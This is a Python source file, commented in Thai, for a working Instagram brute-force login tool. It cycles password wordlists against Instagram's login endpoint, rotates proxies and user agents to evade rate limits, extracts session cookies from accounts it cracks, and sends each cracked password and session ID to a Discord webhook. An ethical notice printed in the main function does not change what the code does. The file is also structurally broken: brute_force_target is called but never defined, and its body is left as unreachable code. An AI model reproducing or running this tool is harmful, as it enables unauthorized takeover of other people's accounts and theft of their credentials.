#!/usr/bin/env python3
"""
🔓 Instagram Brute Force Login with Advanced Proxy Support
รองรับ email/phone/username พร้อม session extraction และ proxy rotation
"""

import time
import json
import random
import requests
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from pathlib import Path

# Import existing modules
from modules.proxy_manager import ProxyManager
from modules.browser_api_manager import BrowserAPIManager
from webhook.discord_notify import send_discord_alert

class InstagramBruteForce:
    """Instagram Brute Force Login with Advanced Proxy Support and Session Extraction"""
    
    def __init__(self, config_file: str = "brute_config.json"):
        self.config = self.load_config(config_file)
        self.proxy_manager = ProxyManager()
        self.browser_api = BrowserAPIManager()
        
        # Session storage
        self.successful_sessions = []
        self.failed_attempts = []
        
        # Rate limiting
        self.request_delay = self.config.get('request_delay', 3)
        self.max_attempts_per_target = self.config.get('max_attempts', 10)
        self.max_concurrent = self.config.get('max_concurrent', 3)
        
        # Proxy management
        self.use_proxy = self.config.get('use_proxy', True)
        self.proxy_rotation_interval = self.config.get('proxy_rotation_interval', 5)
        self.proxy_retry_limit = self.config.get('proxy_retry_limit', 3)
        self.current_proxy_attempts = 0
        self.proxy_failure_count = 0
        
        # User agent rotation
        self.user_agents = self.config.get('user_agents', [
            'Instagram 219.0.0.12.117 Android',
            'Instagram 218.0.0.26.114 Android', 
            'Instagram 217.0.0.15.114 Android',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36'
        ])
        
        # Headers for Instagram API
        self.headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1'
        }
    
    def load_config(self, config_file: str) -> Dict:
        """โหลด configuration file"""
        default_config = {
            "request_delay": 3,
            "max_attempts": 10,
            "max_concurrent": 3,
            "use_proxy": True,
            "proxy_rotation_interval": 5,
            "proxy_retry_limit": 3,
            "use_browser_api": True,
            "wordlists": ["common_passwords.txt", "instagram_passwords.txt"],
            "targets": [],
            "output_file": "brute_results.json",
            "session_output": "extracted_sessions.json",
            "user_agents": [
                "Instagram 219.0.0.12.117 Android",
                "Instagram 218.0.0.26.114 Android", 
                "Instagram 217.0.0.15.114 Android"
            ]
        }
        
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except FileNotFoundError:
            # สร้างไฟล์ config เริ่มต้น
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=2, ensure_ascii=False)
            print(f"📝 สร้าง config file: {config_file}")
        
        return default_config

    def create_session_with_proxy(self, rotate_proxy: bool = False) -> requests.Session:
        """สร้าง session ใหม่พร้อมการจัดการ proxy ที่ดีขึ้น"""
        session = requests.Session()
        
        if self.use_proxy and self.proxy_manager.enabled:
            try:
                if rotate_proxy or self.current_proxy_attempts >= self.proxy_rotation_interval:
                    # ใช้ Bright Data session rotation
                    session = self.proxy_manager.rotate_session()
                    self.current_proxy_attempts = 0
                    print(f"🔄 Rotated to new proxy session")
                else:
                    # ใช้ proxy แบบปกติ
                    proxy = self.proxy_manager.get_random_proxy()
                    if proxy:
                        session.proxies = proxy
                        print(f"🌐 Using proxy: {list(proxy.values())[0][:50]}...")
                
                # Test proxy connection
                try:
                    test_response = session.get('https://httpbin.org/ip', timeout=10)
                    if test_response.status_code == 200:
                        ip_info = test_response.json()
                        print(f"✅ Proxy connection successful - IP: {ip_info.get('origin')}")
                        self.proxy_failure_count = 0
                    else:
                        raise Exception(f"Proxy test failed with status {test_response.status_code}")
                        
                except Exception as e:
                    print(f"❌ Proxy connection failed: {e}")
                    self.proxy_failure_count += 1
                    
                    if self.proxy_failure_count >= self.proxy_retry_limit:
                        print(f"⚠️ Too many proxy failures ({self.proxy_failure_count}), disabling proxy temporarily")
                        session = requests.Session()  # Fallback to direct connection
                    else:
                        # Try to rotate to a different proxy
                        return self.create_session_with_proxy(rotate_proxy=True)
                        
            except Exception as e:
                print(f"❌ Error setting up proxy: {e}")
                session = requests.Session()  # Fallback to direct connection
        else:
            print("🔗 Using direct connection (no proxy)")
        
        # Set random user agent
        session.headers.update({
            'User-Agent': random.choice(self.user_agents)
        })
        
        return session
    
    def load_wordlist(self, wordlist_file: str) -> List[str]:
        """โหลด password wordlist"""
        passwords = []
        
        if not Path(wordlist_file).exists():
            # สร้าง default wordlist
            default_passwords = [
                "123456", "password", "123456789", "12345678", "12345",
                "1234567", "1234567890", "qwerty", "abc123", "111111",
                "123123", "admin", "letmein", "welcome", "monkey",
                "password123", "admin123", "qwerty123", "123qwe", "1q2w3e",
                "instagram", "insta123", "love", "family", "friends"
            ]
            
            with open(wordlist_file, 'w', encoding='utf-8') as f:
                for pwd in default_passwords:
                    f.write(f"{pwd}\n")
            
            print(f"📝 สร้าง default wordlist: {wordlist_file}")
            return default_passwords
        
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ Error loading wordlist {wordlist_file}: {e}")
        
        return passwords
    
    def get_csrf_token(self, session: requests.Session) -> Optional[str]:
        """ดึง CSRF token จาก Instagram"""
        try:
            response = session.get('https://www.instagram.com/', timeout=10)
            if 'csrf_token' in response.text:
                # Extract CSRF token from page
                start = response.text.find('"csrf_token":"') + 14
                end = response.text.find('"', start)
                return response.text[start:end]
        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
        
        return None
    
    def attempt_login(self, target: str, password: str, session: requests.Session) -> Tuple[bool, Dict]:
        """พยายาม login และดึง session พร้อมการจัดการ proxy ที่ดีขึ้น"""
        result = {
            'target': target,
            'password': password,
            'success': False,
            'session_id': None,
            'user_id': None,
            'timestamp': datetime.now().isoformat(),
            'error': None,
            'proxy_used': bool(session.proxies),
            'user_agent': session.headers.get('User-Agent', 'Unknown')
        }
        
        retry_count = 0
        max_retries = 3
        
        while retry_count < max_retries:
            try:
                # ดึง CSRF token
                csrf_token = self.get_csrf_token(session)
                if not csrf_token:
                    result['error'] = 'Failed to get CSRF token'
                    retry_count += 1
                    
                    if retry_count < max_retries:
                        print(f"🔄 Retrying CSRF token fetch (attempt {retry_count + 1})")
                        time.sleep(2)
                        continue
                    else:
                        return False, result
                
                # Update headers with CSRF token
                login_headers = self.headers.copy()
                login_headers['X-CSRFToken'] = csrf_token
                login_headers['User-Agent'] = session.headers.get('User-Agent')
                
                # Login payload
                login_data = {
                    'username': target,
                    'password': password,
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                
                # ทำการ login
                login_url = 'https://www.instagram.com/accounts/login/ajax/'
                response = session.post(
                    login_url,
                    data=login_data,
                    headers=login_headers,
                    timeout=15
                )
                
                self.current_proxy_attempts += 1
                
                # ตรวจสอบผลลัพธ์
                if response.status_code == 200:
                    try:
                        json_response = response.json()
                        
                        if json_response.get('authenticated'):
                            # Login สำเร็จ - ดึง session
                            sessionid = None
                            user_id = json_response.get('userId')
                            
                            # ดึง sessionid จาก cookies
                            for cookie in session.cookies:
                                if cookie.name == 'sessionid':
                                    sessionid = cookie.value
                                    break
                            
                            if sessionid:
                                result.update({
                                    'success': True,
                                    'session_id': sessionid,
                                    'user_id': user_id,
                                    'cookies': dict(session.cookies)
                                })
                                
                                print(f"✅ SUCCESS: {target} | Password: {password}")
                                print(f"   Session ID: {sessionid[:20]}...")
                                print(f"   Proxy Used: {result['proxy_used']}")
                                
                                # Send Discord notification for successful login
                                try:
                                    discord_message = f"🎯 **BRUTE FORCE SUCCESS!**\n"
                                    discord_message += f"**Target:** {target}\n"
                                    discord_message += f"**Password:** ||{password}||\n"
                                    discord_message += f"**Session ID:** {sessionid[:20]}...\n"
                                    discord_message += f"**Proxy Used:** {'✅' if result['proxy_used'] else '❌'}\n"
                                    discord_message += f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                    send_discord_alert(discord_message)
                                except Exception as e:
                                    print(f"Failed to send Discord notification: {e}")
                                
                                return True, result
                            else:
                                result['error'] = 'Login successful but no sessionid found'
                        
                        else:
                            # Login ไม่สำเร็จ
                            error_msg = json_response.get('message', 'Login failed')
                            result['error'] = error_msg
                            
                            if 'rate limited' in error_msg.lower() or 'too many requests' in error_msg.lower():
                                print(f"⚠️ RATE LIMITED: {target}")
                                result['rate_limited'] = True
                                
                                # Rotate proxy on rate limit
                                if self.use_proxy:
                                    print("🔄 Rotating proxy due to rate limit...")
                                    time.sleep(5)
                                    return False, result  # Let caller handle proxy rotation
                                else:
                                    time.sleep(60)  # รอ 1 นาที
                            
                            elif 'checkpoint' in error_msg.lower():
                                print(f"🚨 CHECKPOINT REQUIRED: {target}")
                                result['checkpoint_required'] = True
                            
                            return False, result
                            
                    except json.JSONDecodeError:
                        result['error'] = f'Invalid JSON response: {response.text[:100]}'
                        retry_count += 1
                        
                        if retry_count < max_retries:
                            print(f"🔄 Retrying due to invalid JSON (attempt {retry_count + 1})")
                            time.sleep(2)
                            continue
                
                elif response.status_code == 429:
                    # Rate limited
                    result['error'] = 'Rate limited (HTTP 429)'
                    result['rate_limited'] = True
                    print(f"⚠️ Rate limited (HTTP 429): {target}")
                    
                    if self.use_proxy:
                        print("🔄 Rotating proxy due to rate limit...")
                        return False, result
                    else:
                        time.sleep(60)
                        
                    return False, result
                
                else:
                    result['error'] = f'HTTP {response.status_code}: {response.text[:100]}'
                    retry_count += 1
                    
                    if retry_count < max_retries:
                        print(f"🔄 Retrying due to HTTP error (attempt {retry_count + 1})")
                        time.sleep(2)
                        continue
            
            except requests.exceptions.ProxyError as e:
                result['error'] = f'Proxy error: {str(e)}'
                print(f"❌ Proxy error: {e}")
                
                if self.use_proxy and retry_count < max_retries:
                    print("🔄 Rotating proxy due to proxy error...")
                    return False, result  # Let caller handle proxy rotation
                else:
                    retry_count += 1
                    
            except requests.exceptions.Timeout:
                result['error'] = 'Request timeout'
                retry_count += 1
                
                if retry_count < max_retries:
                    print(f"⏰ Timeout, retrying (attempt {retry_count + 1})")
                    time.sleep(3)
                    continue
                    
            except requests.exceptions.RequestException as e:
                result['error'] = f'Request error: {str(e)}'
                retry_count += 1
                
                if retry_count < max_retries:
                    print(f"🔄 Request error, retrying (attempt {retry_count + 1})")
                    time.sleep(2)
                    continue
                    
            except Exception as e:
                result['error'] = f'Unexpected error: {str(e)}'
                retry_count += 1
                
                if retry_count < max_retries:
                    print(f"🔄 Unexpected error, retrying (attempt {retry_count + 1})")
                    time.sleep(2)
                    continue
        
        return False, result
    
    def brute_force_target_with_browser(self, target: str, passwords: List[str]) -> Dict:
        """Brute force ใน target เดียว โดยใช้ Browser API"""
        print(f"\n🎯 Starting browser-based brute force: {target}")
        print(f"📝 Passwords to try: {len(passwords)}")
        
        results = {
            'target': target,
            'started_at': datetime.now().isoformat(),
            'total_attempts': 0,
            'success': False,
            'session_data': None,
            'attempts': [],
            'method': 'browser_api',
            'countries_used': []
        }
        
        attempt_count = 0
        
        for password in passwords:
            if attempt_count >= self.max_attempts_per_target:
                print(f"⚠️ Reached max attempts ({self.max_attempts_per_target}) for {target}")
                break
            
            attempt_count += 1
            results['total_attempts'] = attempt_count
            
            print(f"🔑 Browser Attempt {attempt_count}: {target} | {password}")
            
            # เลือกประเทศแบบสุ่ม
            country = self.browser_api.get_random_country()
            results['countries_used'].append(country)
            
            # พยายาม login ด้วย Browser API
            browser_result = self.browser_api.instagram_login_with_browser(
                target, password, country=country
            )
            
            attempt_result = {
                'target': target,
                'password': password,
                'success': browser_result.get('success', False),
                'session_id': browser_result.get('session_id'),
                'timestamp': datetime.now().isoformat(),
                'error': browser_result.get('error'),
                'method': 'browser_api',
                'country': country,
                'browser_session': browser_result.get('browser_session')
            }
            
            results['attempts'].append(attempt_result)
            
            if browser_result.get('success'):
                results['success'] = True
                results['session_data'] = attempt_result
                self.successful_sessions.append(attempt_result)
                
                print(f"✅ BROWSER SUCCESS: {target} | Password: {password}")
                print(f"   Session ID: {browser_result.get('session_id', '')[:20]}...")
                print(f"   Country: {country}")
                
                # Send Discord notification for successful login
                try:
                    discord_message = f"🎯 **BROWSER BRUTE FORCE SUCCESS!**\n"
                    discord_message += f"**Target:** {target}\n"
                    discord_message += f"**Password:** ||{password}||\n"
                    discord_message += f"**Session ID:** {browser_result.get('session_id', '')[:20]}...\n"
                    discord_message += f"**Country:** {country}\n"
                    discord_message += f"**Method:** Browser API\n"
                    discord_message += f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    send_discord_alert(discord_message)
                except Exception as e:
                    print(f"Failed to send Discord notification: {e}")
                
                break
            else:
                self.failed_attempts.append(attempt_result)
                print(f"❌ Browser Failed: {browser_result.get('error', 'Unknown error')}")
            
            # Delay ระหว่างการพยายาม
            if attempt_count < len(passwords):
                delay = self.request_delay + random.uniform(1, 3)  # เพิ่ม delay สำหรับ browser
                print(f"⏳ Waiting {delay:.1f} seconds...")
                time.sleep(delay)
        
        results['completed_at'] = datetime.now().isoformat()
        return results

    def run_hybrid_brute_force(self, targets: List[str] = None, wordlists: List[str] = None, use_browser: bool = True) -> Dict:
        """เรียกใช้ brute force แบบ hybrid (ทั้ง requests และ browser)"""
        if not targets:
            targets = self.config.get('targets', [])
        
        if not wordlists:
            wordlists = self.config.get('wordlists', ['common_passwords.txt'])
        
        # โหลด passwords จาก wordlists
        all_passwords = []
        for wordlist in wordlists:
            passwords = self.load_wordlist(wordlist)
            all_passwords.extend(passwords)
        
        # ลบ duplicates และ shuffle
        all_passwords = list(set(all_passwords))
        random.shuffle(all_passwords)
        
        print(f"🚀 Starting Hybrid Instagram Brute Force")
        print(f"📋 Targets: {len(targets)}")
        print(f"🔑 Total passwords: {len(all_passwords)}")
        print(f"⏱️ Delay: {self.request_delay} seconds")
        print(f"🌐 Browser API: {'✅' if use_browser else '❌'}")
        
        # เริ่มการ brute force
        campaign_results = {
            'started_at': datetime.now().isoformat(),
            'targets': targets,
            'total_passwords': len(all_passwords),
            'results': [],
            'methods_used': ['requests', 'browser_api'] if use_browser else ['requests'],
            'summary': {
                'total_targets': len(targets),
                'successful_logins': 0,
                'total_attempts': 0,
                'browser_attempts': 0,
                'requests_attempts': 0
            }
        }
        
        for target in targets:
            # ลองด้วย requests ก่อน (เร็วกว่า)
            print(f"\n🔗 Phase 1: Trying requests method for {target}")
            target_result = self.brute_force_target(target, all_passwords[:10])  # ลองแค่ 10 passwords แรก
            campaign_results['results'].append(target_result)
            campaign_results['summary']['total_attempts'] += target_result['total_attempts']
            campaign_results['summary']['requests_attempts'] += target_result['total_attempts']
            
            if target_result['success']:
                campaign_results['summary']['successful_logins'] += 1
                continue  # ถ้าสำเร็จแล้วไม่ต้องลอง browser
            
            # ถ้า requests ไม่สำเร็จ และเปิดใช้ browser
            if use_browser and self.config.get('use_browser_api', True):
                print(f"\n🌐 Phase 2: Trying browser method for {target}")
                browser_result = self.brute_force_target_with_browser(target, all_passwords[10:])  # ลองส่วนที่เหลือ
                campaign_results['results'].append(browser_result)
                campaign_results['summary']['total_attempts'] += browser_result['total_attempts']
                campaign_results['summary']['browser_attempts'] += browser_result['total_attempts']
                
                if browser_result['success']:
                    campaign_results['summary']['successful_logins'] += 1
        
        campaign_results['completed_at'] = datetime.now().isoformat()
        
        # บันทึกผลลัพธ์
        self.save_results(campaign_results)
        
        return campaign_results
        """Brute force ใน target เดียว พร้อม proxy rotation อัตโนมัติ"""
        print(f"\n🎯 Starting brute force: {target}")
        print(f"📝 Passwords to try: {len(passwords)}")
        
        results = {
            'target': target,
            'started_at': datetime.now().isoformat(),
            'total_attempts': 0,
            'success': False,
            'session_data': None,
            'attempts': [],
            'proxy_rotations': 0,
            'rate_limits_hit': 0
        }
        
        # สร้าง session ใหม่
        session = self.create_session_with_proxy()
        
        attempt_count = 0
        consecutive_failures = 0
        
        for password in passwords:
            if attempt_count >= self.max_attempts_per_target:
                print(f"⚠️ Reached max attempts ({self.max_attempts_per_target}) for {target}")
                break
            
            attempt_count += 1
            results['total_attempts'] = attempt_count
            
            print(f"🔑 Attempt {attempt_count}: {target} | {password}")
            
            # พยายาม login
            success, attempt_result = self.attempt_login(target, password, session)
            results['attempts'].append(attempt_result)
            
            if success:
                results['success'] = True
                results['session_data'] = attempt_result
                self.successful_sessions.append(attempt_result)
                break
            else:
                self.failed_attempts.append(attempt_result)
                print(f"❌ Failed: {attempt_result.get('error', 'Unknown error')}")
                
                # Handle rate limiting and proxy rotation
                if attempt_result.get('rate_limited') or attempt_result.get('error', '').startswith('Proxy error'):
                    consecutive_failures += 1
                    results['rate_limits_hit'] += 1
                    
                    if self.use_proxy and consecutive_failures >= 2:
                        print("🔄 Too many failures, rotating proxy...")
                        session = self.create_session_with_proxy(rotate_proxy=True)
                        results['proxy_rotations'] += 1
                        consecutive_failures = 0
                        time.sleep(5)  # พักเพิ่มเติมหลัง rotate
                else:
                    consecutive_failures = 0
            
            # Delay ระหว่างการพยายาม
            if attempt_count < len(passwords):
                base_delay = self.request_delay
                # เพิ่ม delay หากมี consecutive failures
                additional_delay = consecutive_failures * 2
                total_delay = base_delay + random.uniform(0, 2) + additional_delay
                
                print(f"⏳ Waiting {total_delay:.1f} seconds...")
                time.sleep(total_delay)
        
        results['completed_at'] = datetime.now().isoformat()
        print(f"📊 Proxy rotations during attack: {results['proxy_rotations']}")
        print(f"⚠️ Rate limits encountered: {results['rate_limits_hit']}")
        
        return results
    
    def run_brute_force(self, targets: List[str] = None, wordlists: List[str] = None) -> Dict:
        """เรียกใช้ brute force หลาย targets"""
        if not targets:
            targets = self.config.get('targets', [])
        
        if not wordlists:
            wordlists = self.config.get('wordlists', ['common_passwords.txt'])
        
        # โหลด passwords จาก wordlists
        all_passwords = []
        for wordlist in wordlists:
            passwords = self.load_wordlist(wordlist)
            all_passwords.extend(passwords)
        
        # ลบ duplicates และ shuffle
        all_passwords = list(set(all_passwords))
        random.shuffle(all_passwords)
        
        print(f"🚀 Starting Instagram Brute Force")
        print(f"📋 Targets: {len(targets)}")
        print(f"🔑 Total passwords: {len(all_passwords)}")
        print(f"⏱️ Delay: {self.request_delay} seconds")
        
        # เริ่มการ brute force
        campaign_results = {
            'started_at': datetime.now().isoformat(),
            'targets': targets,
            'total_passwords': len(all_passwords),
            'results': [],
            'summary': {
                'total_targets': len(targets),
                'successful_logins': 0,
                'total_attempts': 0
            }
        }
        
        for target in targets:
            target_result = self.brute_force_target(target, all_passwords)
            campaign_results['results'].append(target_result)
            
            # Update summary
            campaign_results['summary']['total_attempts'] += target_result['total_attempts']
            if target_result['success']:
                campaign_results['summary']['successful_logins'] += 1
        
        campaign_results['completed_at'] = datetime.now().isoformat()
        
        # บันทึกผลลัพธ์
        self.save_results(campaign_results)
        
        return campaign_results
    
    def save_results(self, results: Dict):
        """บันทึกผลลัพธ์ลงไฟล์"""
        # บันทึกผลลัพธ์ทั้งหมด
        output_file = self.config.get('output_file', 'brute_results.json')
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        # บันทึกเฉพาะ successful sessions
        if self.successful_sessions:
            session_file = self.config.get('session_output', 'extracted_sessions.json')
            session_data = {
                'extracted_at': datetime.now().isoformat(),
                'total_sessions': len(self.successful_sessions),
                'sessions': self.successful_sessions
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2, ensure_ascii=False)
            
            print(f"\n✅ Successful sessions saved: {session_file}")
            print(f"🔑 Total sessions extracted: {len(self.successful_sessions)}")
        
        print(f"📁 Full results saved: {output_file}")
        
        # Send Discord completion notification
        try:
            summary = results.get('summary', {})
            discord_message = f"📊 **BRUTE FORCE CAMPAIGN COMPLETED**\n"
            discord_message += f"**Targets:** {summary.get('total_targets', 0)}\n"
            discord_message += f"**Successful Logins:** {summary.get('successful_logins', 0)}\n"
            discord_message += f"**Total Attempts:** {summary.get('total_attempts', 0)}\n"
            discord_message += f"**Sessions Extracted:** {len(self.successful_sessions)}\n"
            discord_message += f"**Completed:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            send_discord_alert(discord_message)
        except Exception as e:
            print(f"Failed to send Discord completion notification: {e}")
    
    def add_target(self, identifier: str, identifier_type: str = "auto"):
        """เพิ่ม target ใหม่"""
        if identifier_type == "auto":
            if "@" in identifier:
                identifier_type = "email"
            elif identifier.isdigit() or identifier.startswith("+"):
                identifier_type = "phone"
            else:
                identifier_type = "username"
        
        target_info = {
            'identifier': identifier,
            'type': identifier_type,
            'added_at': datetime.now().isoformat()
        }
        
        if 'targets' not in self.config:
            self.config['targets'] = []
        
        # ตรวจสอบว่ามีอยู่แล้วหรือไม่
        existing = [t for t in self.config['targets'] if t.get('identifier') == identifier]
        if not existing:
            self.config['targets'].append(target_info)
            print(f"✅ Added target: {identifier} ({identifier_type})")
        else:
            print(f"⚠️ Target already exists: {identifier}")
    
    def create_sample_data(self):
        """สร้างข้อมูลตัวอย่างสำหรับทดสอบ"""
        # สร้าง sample targets
        sample_targets = [
            "test_account_1",
            "demo@example.com", 
            "+66812345678"
        ]
        
        for target in sample_targets:
            self.add_target(target)
        
        # สร้าง sample wordlist
        sample_passwords = [
            "password", "123456", "admin", "test123",
            "instagram", "demo123", "sample", "12345678"
        ]
        
        with open("sample_passwords.txt", "w", encoding="utf-8") as f:
            for pwd in sample_passwords:
                f.write(f"{pwd}\n")
        
        print("📝 Created sample data:")
        print(f"  - Targets: {len(sample_targets)}")
        print(f"  - Passwords: {len(sample_passwords)}")


def main():
    """Main function สำหรับทดสอบ"""
    print("🔓 Instagram Brute Force Tool")
    print("=" * 50)
    
    brute_force = InstagramBruteForce()
    
    # สร้างข้อมูลตัวอย่าง
    brute_force.create_sample_data()
    
    # เพิ่ม targets (ใช้เฉพาะบัญชีทดสอบของตัวเอง)
    print("\n⚠️ ETHICAL NOTICE:")
    print("- ใช้เฉพาะกับบัญชีของตัวเองหรือบัญชีที่ได้รับอนุญาต")
    print("- ไม่ใช้สำหรับการโจมตีบัญชีคนอื่น")
    print("- รับผิดชอบการใช้งานด้วยตัวเอง")
    
    # ตัวอย่างการใช้งาน (ปิดไว้ เพื่อความปลอดภัย)
    print("\n📖 ตัวอย่างการใช้งาน:")
    print("brute_force.add_target('your_test_account')")
    print("brute_force.run_brute_force()")


if __name__ == "__main__":
    main()
